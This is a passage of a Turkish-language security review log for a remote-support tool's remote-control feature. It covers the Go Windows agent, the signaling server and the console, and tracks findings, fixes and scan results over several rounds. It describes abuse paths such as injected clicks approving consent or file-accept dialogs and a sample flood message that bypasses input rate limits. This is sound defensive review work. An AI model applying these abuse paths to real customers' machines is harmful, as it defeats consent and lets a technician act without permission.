Düzeltme: Sunucu, ADMITTED misafir bağlıysa önce `control.revoke{reconnect}`, sonra `peer.left/joined` göndermeli. contracts ve Go `revokeReasons` listesine `reconnect` ve `stale` eklenmeli. Go istemci bilinmeyen `reason` değerini yine kapatma olarak işlemeli: kapatma yönünde şema hatası fail-closed olmalı. (backend-dev)

#### S7-5 [DÜŞÜK] Enjekte tıklama tespiti "sistem genelindeki son basış"a bakıyor; dosya teklifi diyaloğunda hiç yok — A04 (G-03)

Yer: `apps/agent-win/internal/input/host_windows.go:73-76` (`lastPressInjected` her basışta global olarak değişiyor). `internal/ui/control_windows.go:92`. `internal/ui/screens_windows.go:434-480` (`FileOffer`: `LastPressInjected` kontrolü yok, ortak `consentDlg` kullanılmıyor).
Sorun: Kontrol açıkken teknisyen monitör diyaloğundaki "İzin ver" düğmesine enjekte `down` gönderir. Arada müşterinin yaptığı yerel bir tuş basışı bayrağı `false` yapar. Teknisyen 1 sn askı sonrasında `up` gönderir ve BN_CLICKED izin olarak sayılır. Dosya teklifi diyaloğunda teknisyen kendi gönderdiği dosyayı (ör. `.exe`) enjekte tıklamayla doğrudan kabul edebilir. Her iki durumda da kapı zaten açık olduğu için etki sınırlı, ancak G-03'ün "ortak consent_dialog" vaadi karşılanmıyor.
Düzeltme: BN_CLICKED anında `GetCurrentInputMessageSource` (`IMO_INJECTED`) kullanılmalı ya da tıklamayı başlatan `down` olayının bayrağı düğme bazında tutulmalı. Dosya teklifi de `consentDlg` üzerine taşınmalı (Kabul et = enjekte değilse). (backend-dev — Go)

#### S7-6 [DÜŞÜK] Oturum penceresindeki "Erişime izin ver" sabit konumda; imleç-dışı yerleşim kuralı (G-03) bu yolda yok — A04 (clickjacking)

Yer: `apps/agent-win/internal/ui/screens_windows.go:325-331, 343-346`; `control_windows.go:79-87` (`arm` bu düğmeyi de etkinleştiriyor).
Sorun: Müşteri sohbet sırasında oturum penceresindeki Gönder/Oturumu bitir alanında çalışırken teknisyen istek gönderir. 1,5 sn sonra imlecin altında ya da yakınında etkin bir "Erişime izin ver" belirir. Diyalog `PlaceAway` ile konumlanıyor ama bu ikinci yol konumlanmıyor.
Düzeltme: Düğme, imleç düğme dikdörtgenindeyse etkinleştirilmemeli. Ya da ilk 1,5 sn'den sonra yalnız fare düğmenin üstüne yeniden girdikten (`WM_MOUSEMOVE` giriş) sonraki tıklama kabul edilmeli. Daha basit seçenek: bu düğme diyaloğu öne getirsin, izin vermesin. (backend-dev — Go)

#### S7-7 [DÜŞÜK] LL fare/klavye kancaları ve global kısayol programın tüm ömrü boyunca kurulu (KVKK onayı ve lobi öncesi dahil)

Yer: `apps/agent-win/cmd/noktadestek/main.go:71-72` (`input.Start` UI kurulumunun hemen ardından). Agent P7 sapma 7.
Sorun: Kanca yalnız bayrak okuyor, tuş değeri saklamıyor; gizlilik etkisi yok. Ancak (1) imzasız tek dosya + `WH_KEYBOARD_LL`, AV/EDR keylogger buluşsallarını tetikleme olasılığını artırıyor. (2) Her sistem girdisi bir Go geri çağrısından geçiyor; GC duraklamasında sistem genelinde girdi gecikiyor. (3) Ctrl+Shift+F12 bütün süre boyunca başka uygulamalardan alınmış oluyor.
Düzeltme: Kısayol başlangıçta kayıtlı kalabilir (G-21 için gerekçe geçerli). LL kancaları yalnız `phActive` iken ve en azından ilk kontrol isteği ile oturum sonu arasında kurulmalı. Bu kararın gerekçesi implementation.md'ye yazılmalı. (backend-dev — Go)

#### S7-8 [DÜŞÜK] `input` kanalında hız sınırı yok; işleme Pion goroutine'inde senkron yapılıyor

Yer: `apps/agent-win/internal/rtc/rtc.go` `LabelInput` dalı (`OnMessage` → `p.h.Input`); `internal/input/applier.go:87-105`.
Sorun: Kapı kapalıyken her mesaj JSON olarak ayrıştırılıp düşürülüyor. Kapı açıkken sınırsız `SendInput` yapılıyor. Kötü niyetli konsol, müşteri CPU'sunu ve girdi kuyruğunu doldurabilir. 512 bayt sınırı mevcut.
Düzeltme: Token bucket eklenmeli (ör. 250 msg/sn, ani patlama 500). Aşımda düşürülmeli ve sayılmalı. Kapı kapalıyken ayrıştırma yapmadan erken düşürülmeli (`gate.IsOpen()` ön kontrolü, kilit altındaki asıl kontrol korunarak). (backend-dev — Go)

#### S7-9 [DÜŞÜK] İstemci yönetici olarak çalıştırılırsa yükseltilmiş pencereler ve masaüstündeki UAC denetlenebilir; uyarı yok

Yer: `apps/agent-win/internal/env/probe_windows.go:29-31` (kendi süreç yükseltilmişse `elevatedForeground=false`).
Sorun: Müşteri "Yönetici olarak çalıştır" ile açarsa UIPI sınırı kalkar. Teknisyen yönetici yetkisiyle işlem yapar; `PromptOnSecureDesktop=0` olan makinelerde UAC onayını da enjekte tıklamayla verebilir. Gereksinim §"kapsam dışı 2" ile çelişen ve görünmeyen bir yetki artışı.
Düzeltme: Yükseltilmiş çalışma algılanırsa kontrol diyaloğunda açık uyarı gösterilmeli. Tercih edilen yol: kontrol izni verilmemeli ya da `env.state`'e `selfElevated` eklenip audit'e yazılmalı. Karar mimarda. (backend-dev — Go, mimar)

#### S7-10 [DÜŞÜK] Misafirden gelen `control.state` `RECONNECT`/`SYSTEM` kaynağını kabul ediyor

Yer: `packages/contracts/src/ws.ts:104, 118`. §3.3'e göre `RECONNECT`/`TECH` değerlerini yalnız sunucu üretir; misafirden gelirse 1008 olmalı.
Etki: Misafir `REVOKED/RECONNECT` kaydı yazdırabilir; sahte "kopma" kaydıyla zaman çizelgesi yanıltılabilir.
Düzeltme: Misafir şemasına refine eklenmeli: VIEW yalnız `UI|HOTKEY|DENIED|SYSTEM`. (backend-dev)

#### S7-11 [DÜŞÜK / izleme] AC-115 "5 sn" bugün yalnız 60 sn'lik yedek yolla karşılanıyor

Yer: `apps/server/src/signaling/ws.ts:203-215` (`revalidateTech`). `endByTechnician`/`applyPermChange` için kod tabanında bu yol dışında çağıran yok (kullanıcı/yetki servisleri P9/P10'da gelecek).
Durum: S-P3-8 sunucu tarafında doğru kapandı. Yetki tazeleniyor, rol değişimi veya pasif kullanıcı tüm odaları bitiriyor, caps daralırsa `caps.update` + `control.revoke{permission}` gönderiliyor. Ancak P9/P10 servisleri commit sonrası `app.rooms.*` çağırmazsa yetki kaldırıldıktan sonra kontrol en çok 60 sn açık kalır. P9 ve P10 için giriş şartı olarak izlenmeli. (backend-dev)

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found** (2026-11-11, bu tur).
- Gizli bilgi taraması (`git grep` kalıbı, P7 yolları): eşleşme yok.
- govulncheck (`golang:1.26.11-bookworm`, linux + GOOS=windows): **bu tur çalıştırılmadı** (tur sınırı). implementation.md "Agent P7" v1.1.4 sonucunu iki hedefte "0 vulnerabilities" olarak bildiriyor. Yeni bağımlılık yok (`golang.org/x/sys`, stdlib); kanıt bir sonraki turda veya CI çıktısıyla teyit edilmeli.

### Tasarımda vaat edilip kodda bulunmayanlar (§3.3, ADR-0013)

- K1 `control.release` (S7-1), K2 `control.cancel` + `revoke{stale}` + GRANTED yalnız REQUESTED (S7-2), K3 `revoke{reconnect}` (S7-4).
- K4 `monitor.denied`: istemci reddi bildirmiyor, sunucu 30 sn yanıtsızlığa dayanıyor; ret audit'i yok.
- K5-d: oturum sonunda açık kontrol için REVOKED/SYSTEM satırı yazılmıyor (her GRANTED kaydının bir kapanışı olmalı).
- Teknisyen kopmasında bekleyen monitör isteğinin temizlenmesi (`resetControl`, `monitorPending`'e dokunmuyor).
- G-03 "ortak `ui/consent_dialog.go`": dosya teklifi ortak diyaloğu kullanmıyor (S7-5).
- `docs/adr/0013-*.md` dosyası yok (mimar).

### Olumlu

- **Kapı varsayılan kapalı ve yarışsız:** `control.Gate` atomik bool kullanıyor. Kapı her yolda kapanıyor: UI düğmesi UI iş parçacığında, kısayol kanca iş parçacığında, akışı beklemeden kapatıyor; `control.revoke`, `caps.update` (remote_control yok), `peer.left/joined{tech}`, WS kopması, PeerConnection disconnected/failed/closed, her `hello`, `session.ended`, `cleanup` de kapatıyor. `Applier.Handle` kapıyı enjeksiyondan hemen önce, `ReleaseAll` ile aynı kilit altında denetliyor; `Close` döndükten sonra basma olayı uygulanamıyor (AC-101 sağlanıyor; S7-3 gecikme istisnası hariç).
- `EvControlGrant` son savunma katmanı (`flow/control.go:95`): bekleyen istek, etkin oturum, `remote_control` yeteneği ve kayıtlı kısayol şart. Kısayol yoksa izin verilemiyor (G-21).
- İzin diyaloğu: Reddet varsayılan ve odakta. Enter/Space mesaj döngüsünde yutuluyor (`form_windows.go:107-111`). 1,5 sn kilit hem zamanlayıcıyla hem `CanGrant` ile uygulanıyor. Diyalog `PlaceAway` ile imleç dışına yerleşiyor ve birim testli. Diyalog açıkken ikinci istek açılmıyor. İstemci tarafında 30 sn / 5 istek yedek sayacı var.
- Input şeması iki tarafta da katı: ≤512 bayt, geçerli UTF-8, null ve bilinmeyen alan reddi, koordinat 0..1, tekerlek ±1200, `code` `^[A-Za-z0-9]{1,32}$` ve beyaz listedeki VK, `key` ≤4 UTF-16 birimi ve tek yazdırılabilir karakter. Ctrl+Alt+Del ve Win+L engelli. Yalnız kendi bastığı tuşları bırakıyor. `input` DC yalnız `remote_control` yeteneği varken iletiliyor; daralmada `SetCaps` ile kesiliyor.
- Sunucu: `remote_control.use` + caps kontrolü, BROWSER reddi, 30 sn / 5 istek kuralı sunucuda. GRANTED kaydı consent + audit tek TX; 800 ms veya hata durumunda `control.revoke{audit}` + `error{INTERNAL, ref}`; geç commit edilen kayıt REVOKED ile dengeleniyor (G-15 fail-closed). İşlemler oda başına sıralı. `epoch` ile eskimiş GRANTED dengeleniyor. Hata metninde ayrıntı yok.
- S-P3-8: 60 sn yeniden doğrulamada yetkiler tazeleniyor; rol değişimi veya pasif kullanıcı/tenant tüm odaları `auth_revoked` ile bitiriyor; `attachTech` güncel yetkiyle caps'i daraltıyor; caps oturum içinde genişlemiyor.
- Konsol: girdi yalnız GRANTED + görüntü varken gönderiliyor. VIEW, revoke, caps, INTERNAL, peer.left, kopma ya da oturum sonu gelince dinleyiciler sökülüyor ve `k.release_all` gönderiliyor. Ctrl+Alt+Del gönderilmiyor.

### Ajan bazında

- backend-dev (sunucu + contracts): S7-1, S7-2, S7-4, S7-10, S7-11 (izleme).
- backend-dev (Go): S7-1 (istemci tarafı), S7-3, S7-5, S7-6, S7-7, S7-8, S7-9.
- frontend-dev: S7-1 (bırak = `control.release`), S7-2 (Vazgeç + beklenmeyen GRANTED).
- dba: S7-1 (`session_consents.source` CHECK'e `TECH`).
- mimar: ADR-0013 dosyası; S7-9 kararı.

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S7-6, S7-7, S7-8 ve S7-9 "Sonra" listesine alınabilir. S7-3 ve S7-5 Windows elle testinde doğrulanana kadar P7 kapanış listesinde kalmalı.

DURUM: DÜZELTİLMELİ (Yüksek 1: S7-1)

## P7 — Tur 2 — S7-1..S7-11 kapanış doğrulaması + yeni yüzeyler (2026-11-11)

DURUM: DÜZELTİLMELİ
Özet: Kritik 0 / Yüksek 1 / Orta 0 / Düşük 5 (+ S7-9 açık, S7-11 izleme)

Kapsam: Tur 1 sonrası değişiklikler: `apps/server/src/signaling/{control,rooms,handlers}.ts`, `packages/contracts/src/ws.ts`, `apps/agent-win/internal/{control/gate.go, input/{applier.go,host_windows.go}, win/win_windows.go, ui/{form,control}_windows.go, flow/control.go}`. Ölçüt: `docs/mimari-protokol.md` §3.3 K1–K5, ADR-0013 (dosya artık var). Windows'ta çalıştırma yapılmadı; Win32 sabitleri mingw-w64 `winuser.h` ile karşılaştırıldı.

### Tur 1 maddelerinin durumu

| ID    | Durum                                                        | Kanıt / not                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ----- | ------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S7-1  | KAPANDI                                                      | Sunucu `control.ts:157-180` `handleControlClose`: GRANTED/granting → önce bellek VIEW + epoch, misafire `control.release`, teknisyene `{VIEW,TECH}`, sonra REVOKED/TECH + `control.released` (`recordClose`). Açılış yazılırken bırakma `interrupt` ile dengeleniyor (`onGranted` 320-326). Go `flow/control.go:84-91` durumdan bağımsız `gate.Close()` + diyalog kapanışı, yanıt yok. Konsol `k.release_all` → `control.release`, "Kontrole devam" yeni istek. Uçtan uca zincir tutarlı.                                                                                                                                                                                                                      |
| S7-2  | KAPANDI                                                      | `onGranted` yalnız `REQUESTED && !granting` (`control.ts:279-285`); VIEW'da `control.revoke{stale}`, kayıt yok. `control.cancel` var; Go'da cancel sonrası gelen `EvControlGrant` `ctlReq.Pending()` şartıyla düşüyor (`flow/control.go:124`). Konsol beklenmeyen GRANTED'de yakalama başlatmıyor. Misafir başına `control.state` kotası eklenmedi; gerekçe kabul edildi (geçiş kuralları oturum başına ~10 consent satırıyla sınırlıyor, beklenmeyen mesaj kayıt üretmiyor, log dakikada 1).                                                                                                                                                                                                                  |
| S7-3  | KAPANDI (statik) — Windows elle doğrulama bekliyor (adım 37) | `host_windows.go:138-139` WM_HOTKEY → `gate.Shut`; `gate.go:51-62` Swap + goroutine, kilit yok. Kanca geri çağrıları yalnız atomik `Suspend` yazıyor; `Hooks()` yalnız `PostThreadMessage`. Host iş parçacığında `a.mu` veya `g.mu` alan yol yok, kilitlenme döngüsü kırılmış. Close sonrası garanti: `Handle` kapıyı `a.mu` altında, `Inject`'ten hemen önce `Allow` ile denetliyor. `Close` (UI/akış) `ReleaseAll` ile uçuştaki enjeksiyonu bekliyor, dönüşten sonra 0 olay. `Shut` dönüşünde en çok **bir** mesajlık parti (≤ 4 olay; Swap'tan önce `Allow`'u geçmiş) uygulanabilir, sonra `ReleaseAll` basılı kalanları bırakıyor. Yeni basma olayı yok, kabul edilebilir. Bkz. S7-16 (küçük sıra yarışı). |
| S7-4  | KAPANDI                                                      | `rooms.ts:167` ve `:180-181`: ADMITTED misafire önce `control.revoke{reconnect}`, sonra `peer.left/joined{tech}`; `monitorPending` temizleniyor. Go bilinmeyen `reason`'da `ParseServer` hatası → WS kapanışı → `cleanup` kapıyı kapatıyor (kapatma yönü fail-closed).                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| S7-5  | **AÇIK → S7-12 (Yüksek)**                                    | Mekanizma doğru seçilmiş (olay bazlı `GetCurrentInputMessageSource`, bilinmezse enjekte sayma, dosya teklifi ortak `consentDlg`'de). Ancak sabit ters tanımlanmış, ayrıntı aşağıda.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| S7-6  | KAPANDI (statik) — Windows adım 39                           | Oturum penceresindeki düğme yalnız `present()` çağırıyor (imleç dışına yerleştirme, Reddet odağı, 1,5 sn kilidinin yeniden başlaması), izin vermiyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| S7-7  | KAPANDI                                                      | LL kancaları `gate.OnOpen/OnClose` → `Hooks(on)`. `wmHooksOn` işlenirken `g.IsOpen()` tekrar denetleniyor (`host_windows.go:141`). Kısayol baştan kayıtlı (G-21 gerekçesi geçerli).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| S7-8  | KAPANDI, kısmi atlatma → S7-13                               | Kapalı kapıda ayrıştırmadan düşürme ve 250/sn, 500 patlama var. Bırakma muafiyeti sınırı atlatmak için kullanılabiliyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| S7-9  | AÇIK (Düşük) — mimar kararı bekliyor                         | Go yalnız yerel kırmızı uyarı gösteriyor (oturum penceresi ve kontrol diyaloğu). Değerlendirme: müşteri bilgilendiriliyor ve izin yine müşteride, yerel uyarı Düşük için yeterli bir ara önlem. Teknisyene/audit'e görünürlük yok. Sapma 5'teki gerekçe doğru: `env.state` strict olduğu için alan eklemek 1008'e yol açar. Öneri (mimar): `env.state.selfElevated` (contracts + sunucu + konsol rozeti) ve GRANTED audit'inin `newValue`'una `selfElevated` yazılması. P10 prod açılışından önce karara bağlanmalı. GEÇTİ'yi engellemez.                                                                                                                                                                      |
| S7-10 | KAPANDI                                                      | `ws.ts` `controlStateSchema.refine` (GRANTED yalnız UI; VIEW yalnız UI\|HOTKEY\|DENIED\|SYSTEM). Go tarafı da RECONNECT/TECH göndermiyor.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| S7-11 | İZLEME                                                       | Kod değişmedi; implementation.md "P9/P10 için zorunlu not" doğru yazılmış. P9/P10 güvenlik turunda giriş şartı.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |

### Yeni bulgular (öncelik sırasıyla)

#### S7-12 [YÜKSEK] `IMO_INJECTED` sabiti yanlış: enjekte girdi "yerel", donanım girdisi "enjekte" sayılıyor; G-03 enjekte tıklama koruması tersine çalışıyor — A04 Güvensiz Tasarım / A07

Yer: `apps/agent-win/internal/win/win_windows.go:325` (`const imoInjected = 0x01`) ve `:338` (`src.OriginID&imoInjected != 0`). Kullanan: `internal/ui/form_windows.go:141-151` (`track`), `control_windows.go:127` (`tryGrant`).
Kanıt: mingw-w64 `winuser.h` (Debian bookworm `mingw-w64-x86-64-dev`):
`IMO_UNAVAILABLE = 0x0, IMO_HARDWARE = 0x1, IMO_INJECTED = 0x2, IMO_SYSTEM = 0x4`. Koddaki 0x01 değeri **IMO_HARDWARE**'dir.
Sorun: Teknisyenin `SendInput` ile ürettiği tıklamada `OriginID = 2` olur. `2 & 1 == 0` olduğu için `injected=false, known=true` dönüyor ve tıklama yerel kullanıcı tıklaması sayılıyor. Müşterinin gerçek fare/klavye girdisinde ise `OriginID = 1` olduğu için girdi enjekte sayılıyor.
Etki ve istismar:
(1) **İşlevsel:** Gerçek Windows'ta müşteri kontrol izni, monitör izni ve dosya kabulü ("Kabul et") düğmelerinin hiçbirini kullanamaz (`tryGrant` hep reddeder). P7 kullanılamaz durumda. Dosya teklifi ortak diyaloğa taşındığı için P5'teki Go dosya kabulü de bozulmuş durumda (gerileme).
(2) **Güvenlik:** Kapı açıkken (ör. bu belirtiyi gidermek için kaynak denetimini gevşeten bir ara düzeltme ya da başka bir yoldan açılmış kapı) teknisyenin enjekte tıklaması monitör diyaloğunda "İzin ver"i ve dosya teklifinde "Kabul et"i (kendi gönderdiği `.exe` dahil) geçerli sayar. G-03'ün koruması tam tersine işliyor. Bugün kapı ilk kez açılamadığı için doğrudan istismar yolu kapalı, ancak kontrol mantığı ters. Windows elle testinde (adım 38) "hiçbir şey olmuyor" sonucu yanlışlıkla doğru yorumlanabilir.
Linux birim testleri bunu yakalayamıyor: sabit `windows` build etiketi altında ve sahte değerle test edilmiyor.
Düzeltme: `imoHardware = 0x01`, `imoInjected = 0x02`, `imoSystem = 0x04` sabitleri tanımlanmalı. Fail-closed kural: `injected = OriginID != imoHardware`. Yani yalnız IMO_HARDWARE yerel sayılmalı; INJECTED, SYSTEM ve bilinmeyen değerler enjekte sayılmalı. Not: UIAccess uygulamalarının enjeksiyonu da IMO_HARDWARE görünür, bu bilinen bir sınır olarak implementation.md'ye yazılmalı. Eşlemeyi platformdan bağımsız saf bir fonksiyona (`originInjected(id uint32) bool`) ayırıp her değer için birim testi eklenmeli. Windows adım 38 düzeltmeden sonra koşulmalı; ek olarak "müşterinin kendi tıklaması izin verir" adımı da doğrulanmalı. (atanan: backend-dev — Go)

#### S7-13 [DÜŞÜK] Bırakma muafiyeti hız sınırını atlatıyor: basılı olmayan düğme için `m.btn{down:false}` her seferinde fare hareketi + düğme bırakma enjekte ediyor — A04 (DoS)

Yer: `apps/agent-win/internal/input/applier.go:123` (`!isRelease(m) && !a.takeLocked`), `:139` (`isRelease` yalnız `down=false`'a bakıyor), `:185-195` (`translate` `m.btn` dalı, düğme basılı olmasa da `[mv, up]` döndürüyor).
İstismar senaryosu: Değiştirilmiş konsol, kapı açıkken saniyede binlerce `{"t":"m.btn","b":"l","down":false,"x":..,"y":..}` gönderiyor. Her mesaj jeton harcamadan mutlak fare hareketi ve eşleşmeyen bir LBUTTONUP enjekte ediyor. 250/sn sınırı (S7-8) fiilen devre dışı kalıyor; müşteri CPU'su ve girdi kuyruğu doluyor. `k{down:false}` için risk yok: basılı olmayan tuş `key()` içinde `nil` dönüyor. Yerel öncelik (AC-104) ve kısayol çalışmaya devam ettiği için etki Düşük.
Düzeltme: Yalnız **basılı** bir düğme veya tuşun bırakılması muaf tutulmalı (`a.buttons[m.B]` / `a.keys[m.Code]`). Diğer bırakma mesajları jeton harcamalı. Basılı olmayan düğme için bırakma olayı enjekte edilmemeli, en fazla hareket enjekte edilmeli (o da sınırdan geçerek). `TestS78InputRateLimit`'e bu senaryo eklenmeli. (backend-dev — Go)

#### S7-14 [DÜŞÜK] `thread.cur` mesaj gönderimi bittikten sonra sıfırlanmıyor; sonraki `GetMessage` içinde teslim edilen çapraz iş parçacığı `BM_CLICK`'i önceki yerel tıklamanın işaretini görüyor — A04

Yer: `apps/agent-win/internal/ui/form_windows.go:110-125` (`loop`: `track` her mesajın başında `t.cur`'u yazıyor, `TranslateDispatch`'ten sonra sıfırlamıyor), `:157` (`userInput`).
Sorun: Gönderilen (sent) mesajlar `GetMessage` içinde, `track` çalışmadan önce işlenir. Müşteri diyaloğun herhangi bir yerine yerel tıkladıktan hemen sonra aynı masaüstündeki başka bir süreç "İzin ver"e `SendMessage(BM_CLICK)` gönderirse `userInput` true döner. Teknisyen pencere mesajı gönderemediği için (yalnız `SendInput`) tehdit yalnız yerel kötü amaçlı yazılım. Bu da kapsam dışı sayılabilir. Yine de "girdi mesajı işlenmiyorsa false" yorumu bu durumda doğru değil.
Düzeltme: `IsDialogMessage`/`TranslateDispatch` döndükten sonra `t.cur = inputMark{}` yapılmalı. (backend-dev — Go)

#### S7-15 [DÜŞÜK] Misafir kopmasında bekleyen monitör isteği temizlenmiyor; yeniden bağlanan istemcinin `share.state`'i sahte `monitor.granted` yazdırabiliyor — A09

Yer: `apps/server/src/signaling/control.ts:383-389` (`resetOnGuestGone`, `monitorPending`'e dokunmuyor), `:245-253` (`onShareMonitor`).
Sorun: Teknisyen 2 numaralı monitörü istiyor, istemci kopuyor ve 30 sn içinde yeniden bağlanıyor. Yeni istemci diyalog göstermeden ilk `share.state`'ini gönderiyor. `activeMonitor` bekleyen kimlikle aynıysa (ör. istemcinin seçtiği varsayılan monitör o ise) müşteri onayı olmadığı hâlde audit'e `monitor.granted` yazılıyor. Ayrıca teknisyen 30 sn boyunca `CONFLICT`, ardından 30 sn `RATE_LIMITED` alıyor. Aynı kimlik zaten etkin olan monitör istendiğinde de benzer sahte kayıt oluşuyor. Monitör değişimini sahte bildirmek için tek başına bir kontrol açılmıyor; etki zaman çizelgesi bütünlüğüyle sınırlı.
Düzeltme: `resetOnGuestGone`'da `monitorPending = undefined` yapılmalı (teknisyen tarafında K3'te zaten yapılıyor). `handleMonitorRequest` `share.activeMonitor === monitorId` için istek açmamalı (no-op / VALIDATION). (backend-dev)

#### S7-16 [DÜŞÜK] `Shut` dinleyicileri goroutine'de çalıştığından gecikmiş `Hooks(false)`, hemen ardından açılan kapının kancalarını kaldırabiliyor — A04 (AC-104)

Yer: `apps/agent-win/internal/control/gate.go:51-62`, `internal/input/host_windows.go:149-150` (`wmHooksOff` kapı durumuna bakmıyor).
Sorun: Kısayolla kapatma → goroutine zamanlanmadan önce yeniden `Open` → `HooksOn`, ardından geç gelen `HooksOff`. Sonuçta kapı açık, kancalar yok: yerel öncelik çalışmaz. Kapı ve kısayol etkilenmez. Pratikte yeni istek ve 1,5 sn kilidi gerektiği için olasılık çok düşük.
Düzeltme: `wmHooksOff` işlenirken `if !g.IsOpen() { unhook() }` denetimi yapılmalı (`wmHooksOn`'daki desenin simetriği). (backend-dev — Go)

### Yeni yüzeylerin incelemesi (bulgu yok)

- **release/cancel yarışları:** `handleControlClose` kuyruğa alınmıyor ama bellekte eşzamanlı çalışıyor. Kuyrukta bekleyen `onGranted` VIEW gördüğünde `revoke{stale}` gönderiyor. İstek audit'i sürerken gelen iptal epoch ile `superseded` ediliyor, müşteriye geç istek gitmiyor. Go tarafında `ctlReq.Pending()` şartı geç `EvControlGrant`'i düşürüyor; olay sırası tersse kapı açılıp hemen kapanıyor ve sunucu `stale` ile tutarlı kalıyor.
- **Consent dengeleme satırları:** `recordClose` → granting ise `interrupt ??=` (ilk kapatma kazanıyor). `onGranted` commit sonrası epoch farkında `interrupt` ile REVOKED yazıyor. Zaman aşımında geç commit `balance` ile dengeleniyor. Hata (rollback) yolunda dengeleme gerekmiyor. Her GRANTED satırına tam bir kapanış düşüyor. `closeControlOnEnd` `session.ended` sonrası yazıyor ve beklenmiyor (K5-d).
- **`monitor.denied` sahteciliği:** Yalnız AGENT ve yalnız bekleyen kimlikle kabul ediliyor. Müşteri zaten reddedebileceği için yeni yetki doğmuyor. Kayıt bekleyen istek sayısıyla sınırlı (≤ 5). Teknisyenden gelen `monitor.denied` şemada yok, 1008.
- **CONFLICT kuralı:** REQUESTED'de ikinci istek ve bekleyen monitör isteğinde yeni istek `CONFLICT`. Sayaç sızdırmıyor, bilgi sızıntısı yok.
- **Açılış penceresi (bilgi):** Go kapıyı `GRANTED` göndermeden önce açıyor. Sunucu kaydı 800 ms içinde yazılamazsa `revoke{audit}`. Bu sürede kayıt olmadan girdi uygulanabilir. ADR-0009/G-15 gereği kabul edilmiş tasarım; konsol GRANTED onayı gelmeden girdi göndermiyor.

### Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found** (2026-11-11).
- govulncheck v1.1.4, `golang:1.26.11-bookworm`, DB 2026-11-11 (`apps/agent-win`):
  - linux: "Your code is affected by 0 vulnerabilities", exit 0.
  - `GOOS=windows GOARCH=amd64`: "Your code is affected by 0 vulnerabilities", exit 0.
  - Gereken modüllerde çağrılmayan 3 kayıt var: GO-2026-6866 ve GO-2026-6860 (`golang.org/x/net@v0.60.0`, düzeltme v0.62.0), GO-2026-5932 (`golang.org/x/crypto@v0.57.0`, düzeltme pseudo-version). Kod bu sembolleri çağırmıyor. Dependabot ile yükseltilmesi önerilir (Bilgi).
- Gizli bilgi (`git grep` kalıbı; izlenen ve izlenmeyen P7 dosyaları): eşleşme yok. Git geçmişinde yalnız `.env.example` var.

### Tasarımda vaat edilip kodda bulunmayanlar

- G-03 "enjekte tıklamayla izin verilemez": mekanizma var, sabit yanlış (S7-12).
- Tur 1 listesindeki K1–K5, `monitor.denied`, oturum sonu kapanış satırı, teknisyen kopmasında monitör temizliği ve ADR-0013 dosyası: **tamamlandı**. Misafir kopmasında monitör temizliği eksik (S7-15).

### Windows elle doğrulama bekleyenler (GEÇTİ'yi engellemez; S7-12 düzeltildikten sonra)

Adım 37 (S7-3: sürekli hareket altında kısayol, takılma yok, AC-104 sonrası kanca hâlâ etkin), 38 (S7-5/S7-12: teknisyen enjekte tıklaması ve Alt+İ izin vermez, **müşterinin kendi tıklaması izin verir**; dosya kabulünde de aynısı), 39 (S7-6), 40 (S7-7), 42 (S7-9 uyarısı).

### Olumlu

- Kapatma yönü her katmanda DB'den bağımsız ve iki katmanlı (sunucu revoke + istemci `peer.*`/`hello`/kopma). Yeni mesajların hiçbiri kapıyı açamıyor.
- Host iş parçacığı kilitsiz; kilit sırası yorumla ve `TestS73HotkeyOnHookThreadDoesNotDeadlockWithSendInput` ile güvenceye alınmış.
- Kancalar artık yalnız kontrol açıkken kurulu; global "son basış" bayrağı kaldırılmış.
- Misafir şeması sunucu kaynaklarını reddediyor (1008). Fixture'lar iki dilde ortak.

### Ajan bazında

- backend-dev (Go): **S7-12 (zorunlu)**, S7-13, S7-14, S7-16.
- backend-dev (sunucu): S7-15.
- mimar: S7-9 kararı (`env.state.selfElevated` + audit).

### Öneri (`docs/gereksinimler.md` §9 "Sonra")

S7-13, S7-14, S7-15, S7-16 ve S7-9 (mimar kararı) "Sonra" listesine alınabilir. Go `x/net`/`x/crypto` yükseltmesi Dependabot ile yapılabilir.

DURUM: DÜZELTİLMELİ (Yüksek 1: S7-12 — `IMO_INJECTED` sabiti; düzeltme tek satır + birim testi)

---

## P7 — Tur 3 — S7-12..S7-16 kapanışı + K6/K8 (2026-11-11)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 (yeni). S7-12 (Yüksek) kapandı. S7-11 izlemede. Windows elle doğrulama bekleyenler aşağıda listelendi.

Kapsam: Tur 2'den sonra değişen yerler: `apps/agent-win/internal/{control/{origin,gate}.go, win/win_windows.go, ui/form_windows.go, input/{applier,host_windows}.go, flow/{control,flow}.go, signal/messages.go}`, `cmd/noktadestek/main.go`, `apps/server/src/signaling/{control,types}.ts`, `packages/contracts/src/ws.ts` + fixtures, `apps/web/lib/control/machine.ts`, `components/console/{stage,control-button}.tsx`. Ölçüt: `docs/mimari-protokol.md` §3.3 K6–K8, "P7 Tur 2 kararları", ADR-0013 "Ek — P7 Tur 2". `go.mod`/`go.sum`/`pnpm-lock.yaml` HEAD'e göre değişmemiş. Bu yüzden govulncheck/audit tekrar koşulmadı, Tur 2 sonucu geçerli.

### Tur 2 maddelerinin durumu

| ID                    | Durum                                          | Kanıt / not                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
